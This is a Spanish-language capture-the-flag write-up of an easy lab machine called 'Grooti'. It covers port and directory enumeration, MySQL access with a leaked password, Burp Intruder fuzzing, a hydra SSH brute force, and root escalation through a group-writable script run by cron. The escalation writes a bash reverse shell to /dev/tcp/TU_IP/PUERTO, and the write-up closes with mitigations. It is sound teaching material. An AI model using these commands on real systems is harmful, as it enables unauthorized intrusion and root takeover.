## Resumen
Es una maquina de dificultad facil en la que tendremos que enumerar subdirectorios, fuzzear formularios, entrar a bases de datos y escalar privilegios con un crontab.


## Enumeracion
Empiezo con un ping para saber si la maquina esta activa y tambien para mediante el TTL saber el sistema operativo.
`ping -c 1 vmip`

```
PING vmip (vmip) 56(84) bytes of data.
64 bytes from vmip: icmp_seq=1 ttl=64 time=0.250 ms
```

Con esto puedo saber que es una maquina linux.



Sigo con nmap para escanear y ver que puertos tiene abiertos.
`nmap -sVC vmip`
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 46:69:49:1a:d0:b7:26:05:90:a3:22:b2:a8:fe:fd:83 (ECDSA)
|_  256 91:67:c5:15:53:13:af:6f:28:7d:1e:77:46:0c:c1:bb (ED25519)
80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: \xF0\x9F\x8C\xB1 Grooti's Web
3306/tcp open  mysql   MySQL 8.0.42-0ubuntu0.24.04.2
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.42-0ubuntu0.24.04.2
|   Thread ID: 11
|   Capabilities flags: 65535
|   Some Capabilities: FoundRows, Speaks41ProtocolOld, ODBCClient, Support41Auth, SupportsCompression, InteractiveClient, IgnoreSigpipes, DontAllowDatabaseTableColumn, LongPassword, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, SupportsTransactions, SwitchToSSLAfterHandshake, SupportsLoadDataLocal, LongColumnFlag, ConnectWithDatabase, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: w%LZgc\x1AL!\x1E\x16;Rd\x10`'K+\x0C
|_  Auth Plugin Name: caching_sha2_password
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=MySQL_Server_8.0.42_Auto_Generated_Server_Certificate
| Not valid before: 2025-07-18T22:37:08
|_Not valid after:  2035-07-16T22:37:08
MAC Address: AE:AC:37:F5:7B:CE (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Puertos/servicios encontrados 
```
3306/Mysql
80/Apache 
22/SSH
```
Empiezo con el apache para ver si puedo sacar mas informacion ya que los otros piden contraseña.

## Analisis puerto 80

Empiezo haciendo un curl para ver que nos devuelve la web.
`curl vmip`
```
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>🌱 Grooti's Web</title>
    <style>
        body {
            background-color: #0b0c10;
            color: #d4fc79;
            font-family: 'Courier New', monospace;
            text-align: center;
            padding-top: 50px;
        }
        h1 {
            font-size: 3em;
            color: #66fcf1;
        }
        .grooti {
            font-size: 1.2em;
            color: #45a29e;
        }
        a {
            color: #50fa7b;
            text-decoration: none;
        }
        footer {
            margin-top: 40px;
            color: #888;
            font-size: 0.8em;
        }
    </style>
</head>
<body>
    <h1>🌱 I AM GROOTI16</h1>
    <p class="grooti">I am grooti. I am grooti? I... am grooti.</p>
    
    <p>🌌 Bienvenidos a mi universo.</p>
    <p>Explora mis archivos:</p>
    <ul style="list-style: none;">
        <li><a href="/imagenes/">Mis Fotos</a></li>
        <li><a href="/documentos/">Mi base de datos</a></li>
        <li><a href="/archives/">Facturas de la nave</a></li>
    </ul>

    <!-- 
        I am Grooti...
        Creo que Rocket ha entrado a mi base de datos...


    -->

    <img src="groot.jpg" alt="Foto de Grooti" style="width:200px; height:auto; border-radius:10px; margin-top:30px;">

    <footer>
        Grooti Inc. | Yo soy Grooti, tú eres... ¿root?
    </footer>
</body>
</html>
```

Se puede leer un comentario de que un tal rocket a entrado a la base de datos.

Tambien se detecta un directorio de imagenes (/imagenes), y al entrar hay un readme con una contraseña.
`cat README.txt`
`(****) Encuentra donde ponerla ;)`

Continuando con la enumeracion sigo enumerando subdirectorios con gobuster.
`gobuster dir -u http://vmip   -w /usr/share/wordlists/dirb/common.txt`
```
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htpasswd            (Status: 403) [Size: 275]
.htaccess            (Status: 403) [Size: 275]
.hta                 (Status: 403) [Size: 275]
archives             (Status: 301) [Size: 311] [--> http://vmip/archives/]
imagenes             (Status: 301) [Size: 311] [--> http://vmip/imagenes/]
index.html           (Status: 200) [Size: 1436]
secret               (Status: 301) [Size: 309] [--> http://vmip/secret/]
server-status        (Status: 403) [Size: 275]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished

```

Gobuster detecta un directorio `/secret` que muestra una lista de usuarios con sus respectivos roles y un boton para descargar un archivo de instrucciones.
`curl http://vmip/secret`
```
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <title>Base de Datos de Grooti - Nave Estelar</title>
  <style>
    body {
      background-color: #0b0c10;
      color: #66fcf1;
      font-family: 'Orbitron', sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      height: 100vh;
      margin: 0;
      padding: 20px;
    }
    h1 {
      margin-top: 30px;
      font-size: 3em;
      letter-spacing: 0.15em;
      text-shadow: 0 0 10px #45a29e;
    }
    .container {
      background: #1f2833;
      border: 2px solid #45a29e;
      border-radius: 12px;
      padding: 20px 40px;
      width: 400px;
      box-shadow: 0 0 30px #45a29e;
      margin-top: 40px;
      text-align: center;
    }
    .db-table {
      margin: 20px 0;
      border-collapse: collapse;
      width: 100%;
    }
    .db-table th, .db-table td {
      border: 1px solid #45a29e;
      padding: 8px 12px;
      font-size: 1.1em;
    }
    .db-table th {
      background-color: #0b0c10;
    }
    a.download-link {
      display: inline-block;
      margin-top: 25px;
      padding: 10px 25px;
      color: #0b0c10;
      background-color: #66fcf1;
      font-weight: bold;
      text-decoration: none;
      border-radius: 8px;
      transition: background-color 0.3s ease;
    }
    a.download-link:hover {
      background-color: #45a29e;
      color: #c5f6f5;
    }
    footer {
      position: fixed;
      bottom: 10px;
      font-size: 0.8em;
      color: #45a29e;
    }
  </style>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron&display=swap" rel="stylesheet" />
</head>
<body>
  <h1>Base de Datos de rocket</h1>
  <div class="container">
    <p><strong>Ubicación:</strong> Nave Estelar Milano</p>
    <table class="db-table" aria-label="Tabla de usuarios y permisos">
      <thead>
        <tr>
          <th>Usuario</th>
          <th>Acceso</th>
          <th>Estado</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td>grooti</td>
          <td>Administrador</td>
          <td>Activo</td>
        </tr>
        <tr>
          <td>rocket</td>
          <td>Subcordinador</td>
          <td>Activo</td>
        </tr>
        <tr>
          <td>Naia</td>
          <td>Total</td>
          <td>Activo</td>
        </tr>
      </tbody>
    </table>
    <a href="instrucciones.txt" download class="download-link" title="Descargar archivo de instrucciones">Descargar archivo de instrucciones</a>
  </div>
  <footer>©  - Sistema Grooti</footer>
</body>
</html>

```


Abro el archivo de instrucciones.
`tail instrucciones.txt`
`mysql -u rocket -p -h vmip --ssl=0`

## Analisis puerto 3306
Nos dice un comando para conectarnos a MySQL como el usuario rocket.

Al ejecutar el comando nos pide una contraseña y uso la anteriormente encontrada en el `README.txt`.

La contraseña es valida, una vez dentro compruebo los privilegios del usuario con:
`SHOW GRANTS;`

```
+--------------------------------------------------+
| Grants for rocket@%                              |
+--------------------------------------------------+
| GRANT USAGE ON *.* TO `rocket`@`%`               |
| GRANT SELECT ON `files_secret`.* TO `rocket`@`%` |
+--------------------------------------------------+
```

Nos dice que solo tiene permisos en `files_secret`.

Listo las tablas de `files_secret` y parece que tiene una llamada rutas asi que listo el contenido de la tabla.
` USE files_secret;`
`SHOW TABLES;`
`select * from rutas;`

```
+----+------------+---------------------------------+
| id | nombre     | ruta                            |
+----+------------+---------------------------------+
|  1 | imagenes   | /var/www/html/files/imagenes/   |
|  2 | documentos | /var/www/html/files/documentos/ |
|  3 | facturas   | /var/www/html/files/facturas/   |
|  4 | secret     | *******               |
+----+------------+---------------------------------+

```

Lista unos directorios pero hay uno nuevo.


## Fuzzing web

Hago un curl de nuevo a la pagina con el nuevo directorio.
`curl vmip/*****`
```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Control de Acceso – Grooti Systems</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Courier New', monospace;
      background-color: #0c0c0c;
      color: #33ff33;
      background-image: radial-gradient(#0c0c0c 30%, #001100 100%);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }

    .terminal {
      background-color: #111;
      border: 2px solid #33ff33;
      padding: 30px;
      border-radius: 12px;
      width: 500px;
      box-shadow: 0 0 20px #33ff33;
      text-align: center;
    }

    h1 {
      font-size: 26px;
      margin-bottom: 10px;
      text-shadow: 0 0 10px #33ff33;
    }

    p {
      font-size: 14px;
      color: #9f9;
    }

    input[type="text"],
    input[type="number"] {
      width: 80%;
      padding: 10px;
      margin: 10px 0;
      background-color: #222;
      color: #33ff33;
      border: 1px solid #33ff33;
      border-radius: 8px;
    }

    button {
      padding: 10px 25px;
      background-color: #33ff33;
      border: none;
      color: #000;
      font-weight: bold;
      border-radius: 8px;
      cursor: pointer;
      transition: background 0.3s ease;
    }

    button:hover {
      background-color: #44ff44;
    }

    .groot-console {
      font-size: 12px;
      margin-top: 15px;
      color: #77ff77;
    }

    .ascii {
      font-size: 10px;
      line-height: 10px;
      color: #0f0;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <div class="terminal">
    <h1>🛸 Grooti Terminal Access</h1>
    <p>Acceso restringido al sistema de logs de la nave</p>
    <form action="generate.php" method="POST">
      <input type="text" name="content" placeholder="Mensaje de acceso..." required><br>
      <input type="number" name="number" placeholder="Número entre 1 y 100" min="1" max="100" required><br>
      <button type="submit">Transmitir a Groot</button>
    </form>
    <div class="groot-console">Registro automático de cada entrada. Límites aplicados.</div>

    <div class="ascii">
<pre>
        ,#####,
        #_   _#
        |a` `a|
        |  u  |
        \  =  /
        |\___/|
  ___ ___)/ :=(\___ ___
 /   '._.'     '._.'   \
|        Grooti Terminal |
 \_____)\_______/(_____/
</pre>
    </div>
  </div>
</body>
</html>

```

Pone que nos estan restrigiendo el acceso y pide un mensaje y un numero del 1 al 100.

Al hacer una prueba e interceptar la peticion con Burpsuite enseña que manda una peticion POST.
Lo mando al intruder y pongo que el valor que se tiene que fuzzear sea el del numero y eligiendo el parametro numbers.


```
POST ****** HTTP/1.1
Host: vmip
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 18
Origin: http://vmip
Connection: keep-alive
Referer: http://vmip/*******
Upgrade-Insecure-Requests: 1
Priority: u=0, i

content=a&number=
```

Poco despues de lanzar el ataque veo que hay una peticion con mucho mas tamaño que las demas asi que entro a verla.
```
HTTP/1.1 200 OK
Date: Mon, 28 Sep 2026 21:10:46 GMT
Server: Apache/2.4.58 (Ubuntu)
Content-Description: File Transfer
Content-Disposition: attachment; filename="password******.zip"
Expires: 0
Cache-Control: must-revalidate
Pragma: public
Content-Length: 429
Keep-Alive: timeout=5, max=94
Connection: Keep-Alive
Content-Type: application/zip

PK****
```


Ahora vuelvo a la pagina y pongo el numero encontrado y veo que me descarga un archivo llamado `password******.zip`  asi que lo descomprimo e investigo su contenido.

`unzip password*****.zip`

A la hora de descomprimirlo me pide una contraseña, asi que pruebo la antes encontrada en el "README" y se descomprime.

`cat password****.txt`

El contenido consiste en una lista de contraseñas.


## Fuerza bruta con hydra

Teniendo ya una lista de contraseñas y habiendo descubierto en la web que hay un usuario administrador llamado `grooti` realizo un ataque de fuerza bruta en contra del servicio SSH.

`hydra -l grooti -P password*****.txt ssh://vmip`

Al poco tiempo encontramos una coincidencia.

`[22][ssh] host: vmip   login: grooti   password: *****`



## Escalada de privilegios

Empiezo ejecutando `whoami` y `groups` para tener un poco de contexto

`whoami`
`grooti`

`groups`
`grooti users`

 Sigo con `sudo -l` pero no da resultados.

`Sorry, user grooti may not run sudo on 0fac3ed1702b.`

Sigo buscando SUIDS pero son los estandar.

`find / -perm -4000 -type f 2>/dev/null`


```
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/umount
/usr/bin/su
/usr/bin/mount
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/sudo
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```


Sigo con `crontab -e` y veo que hay un script ejecutandose cada minuto.

`* * * * * /opt/cleanup.sh`

Reviso los permisos y veo que solo lo puede escribir root. 
Pero ese script lo que hace es ejecutar otro que si podemos escribir nosotros ya que estamos en el grupo correspondiente.

`ls -la /opt/cleanup.sh 

`-rwxr-xr-- 1 root root 36 Jul 22  2025 /opt/cleanup.sh`


`cat /opt/cleanup.sh`


```
#!/bin/bash

bash /tmp/malicious.sh
```


`ls -la /tmp/malicious.sh`
`-rwxrw-r-- 1 root grooti 221 Jul 22  2025 /tmp/malicious.sh`


`cat /tmp/malicious.sh `
```
#!/bin/bash

LOG_TEMP="/tmp/mi_log_temporal.log"

echo "Log temporal creado a $(date)" > "$LOG_TEMP"
echo "Archivo $LOG_TEMP creado."

sleep 2

rm -f "$LOG_TEMP"
echo "Archivo $LOG_TEMP eliminado después de 2 segundos."

```


Sobreescribo el script con:

`echo 'bash -i >& /dev/tcp/TU_IP/PUERTO 0>&1' > /tmp/malicious.sh`

Lo que hacemos con esto es mandar una shell interactiva a la ip y puerto elegida. Y como el script se ejecuta como root, la shell sera como usuario root.

Pongo el netcat a escuchar:

` nc -lvnp 4444 `

Y al de poco tiempo tenemos la shell, una vez dentro tenemos la flag que es un ASCII art.

`ls -la`
`cat grooti.txt`

```

⠰⣶⣶⣶⣄⠀⠀⠀⢀⣀⠀⠀⣠⣄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠻⣿⣿⣿⡀⠀⠀⣿⠿⠷⢾⡏⠉⣿⣄⢀⣿⣷⡆⠀⠀
⢀⣠⣬⡁⢸⣿⣶⣿⣿⡇⠀⣾⡇⠀⣿⡏⠛⢻⣿⢧⣤⠀
⢸⣿⡿⡿⢻⠇⠀⢿⣿⡇⣠⣿⡇⣼⡿⠀⠀⣼⡏⢠⣾⠀
⢸⣿⡀⢀⣿⠀⣴⠈⣿⣿⣿⣿⣿⣿⠃⣾⣤⣿⠀⣼⣿⠀
⢸⣿⣧⢸⣿⣧⣿⣇⣿⣿⣿⣿⣿⣿⣾⣿⣿⣏⣼⣿⣿⠀
⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁
⠀⢹⣿⣿⣿⣿⣿⠉⠙⣿⣿⣿⣿⣿⡯⠉⢻⣿⣿⣿⣿⠀
⠀⠸⣿⣿⣿⣧⡀⠀⣠⣿⣿⣿⣿⣄⠀⢀⣼⣿⣿⣿⠇⠀
⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀
⠀⠀⠘⣿⣿⣿⣿⣿⡿⠿⠿⢿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀
⠀⠀⠀⠘⣿⣿⣿⣿⣷⣄⣀⣀⣠⣿⣿⣿⣿⠏⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⠿⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀

```



## Mitigaciones

- Evitar la reutilizacion de contraseñas entre servicios.
	Ya que la contraseña del README servia para entrar a la DB y para descomprimir el zip.
- Evitar guardar contraseñas en subdirectorios de la web sin seguridad.
	Ya que el README encontrado estaba en un subdirectorio.
- Aplicar el principio de "least privilege" en permisos de archivos usados por tareas root.
	El script `/opt/cleanup.sh`, ejecutado por cron como root cada minuto, invocaba `/tmp/malicious.sh`, un archivo con permisos de escritura para el grupo `grooti`, cualquier usuario de ese grupo podía modificar código que luego se ejecutaba con privilegios de root.
- Evitar guardar contraseñas en documentos de texto en vez de en gestores de contraseñas.
	Se puedo encontrar una lista de contraseñas en un txt y otra en un README.
- Limitar los intentos erroneos al servicio SSH.
	No hubo ningun tipo de bloqueo o de penalizacion a la hora de hacer el ataque de fuerza bruta.